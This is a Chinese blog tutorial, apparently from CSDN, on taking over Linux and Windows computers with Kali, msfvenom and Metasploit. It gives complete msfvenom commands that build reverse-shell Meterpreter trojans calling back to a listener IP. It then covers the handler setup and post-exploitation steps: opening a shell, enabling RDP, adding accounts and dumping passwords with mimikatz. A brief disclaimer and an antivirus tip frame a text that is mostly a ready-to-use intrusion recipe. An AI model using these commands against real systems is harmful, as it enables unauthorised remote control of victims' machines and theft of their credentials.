声明：本篇内容，禁止用作非法目的，谢绝一切形式的转载。

当你在无意间点击一个链接后，当你在不明情况安装一个程序时，当你忍不住点击一个美女图片的时候，你的设备可能就此沦陷了，成为了黑客眼中的"肉鸡"。

### kali Linux

Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。由Offensive Security
Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon
Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。

### Metersploit

Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。

### Meterpreter

Meterpreter是 Metasploit 框架中的一个杀手锏,通常作为漏洞溢出后的攻击在和使用, 攻击在和在出发漏洞后能够返回给我们一个控制通道.

### Linux攻击

#### 生成木马

网络上有好多生成木马的方式，但是大多数都是相互copy，甚至有的还可能包含病毒，谨慎使用。网络上下载的所有软件都要慎用，除非是在官网上下载的。生成一个使用于Linux
64位系统的木马，生成木马的命令如下：

  1. `msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.42.49 LPORT=5555 -i 3 -f elf -o test`

LHOST 代表Listening host。LPORT代表Listening port。后续介绍网络的时候会详细讲解。

翻译一下这个命令:平台Linux
x64架构，使用payload是linux/x64/meterpreter/reverse_tcp，目标文件的格式是elf。可执行目标文件的名称是test。通过上面的命令，我们就就可以生成一个elf格式的test程序，当在远端(也就是"肉鸡")执行这个程序的时候，如果本地开启了监听，肉鸡和本机之间就建立了一条通信的channel，通过这个木马就能实现控制远端的肉鸡了，邪恶的微笑。

#### 开启监听

  1. 开启msf

  1. `msfconsole`

  1. 加载模块

  1. `msf5 > use exploit/multi/handler `

  1. 设置payload

  1. `msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp`

  1. 设置监听ip

  1. `msf5 exploit(multi/handler) > set lhost 192.168..42.49`

  1. 设置监听port

  1. `msf5 exploit(multi/handler) > set LPORT 5555`

  1. 执行

  1. `msf5 exploit(multi/handler) > exploit`

#### 攻击效果

当执行玩exploit之后，我们可以获得一个Meterpreter。通过这个meterpreter，可以查看肉鸡中的文件，进程等。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628143433457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)可以开启一个shell，这样基本等同于完全操控目标计算机了。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628143541995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628143712297.png)通过查看whoami可知正是当前登陆用户的帐号。如何提升权限，后续会介绍。

### Windows攻击

#### 生成木马

  1. `msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.42.49 LPORT=4444 -i 3 -f exe -o payload_test.exe`

具体含义可参考上文。

#### 开启监听

  1. 开启msf

  1. `msfconsole`

  1. 加载模块

  1. `msf5 > use exploit/multi/handler `

  1. 设置payload

  1. `msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp`

  1. 设置监听ip

  1. `msf5 exploit(multi/handler) > set lhost 192.168..42.49`

  1. 设置监听port

  1. `msf5 exploit(multi/handler) > set LPORT 4444`

  1. 执行

  1. `msf5 exploit(multi/handler) > exploit`

#### 攻击效果

当执行玩exploit之后，我们可以获得一个Meterpreter。通过这个meterpreter，可以查看肉鸡中的文件，进程等。同Linux。![在这里插入图片描述](https://img-blog.csdnimg.cn/2020062814475058.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)查看那getuid是Administrator，管理员权限。在Windows下，这还不是最高的权限，最高的权限是system，至于如何提权，后续会讲解。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628145138884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)开启一个shell，发现有乱码，这是由于Linux和Windows采用的编码方式不一致导致的。可以通过
`chcp65001`解决这个问题。

##### 桌面截图

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628145811575.png)

##### 开启远程桌面

通过以下命令开启rdp服务

  1. `run post/windows/manager/enable_rdp`

如图：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628150047854.png)

添加用户

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628150429313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)

##### 帐号密码破解

使用minikatz进行密码破解![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628150822219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)

##### 远程桌面

通过 `rdestop目标ip-u账户`，可以实现远程桌面的控制。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628151159132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628151213908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)

### 写在最后

对于不明来历的链接、软件不要乱点。尽量安装一个杀毒软件。密码尽量复杂。

### 公众号

更多内容，欢迎关注我的公众号：无情剑客![在这里插入图片描述](https://img-blog.csdnimg.cn/20200628151450175.jpg)

  
  

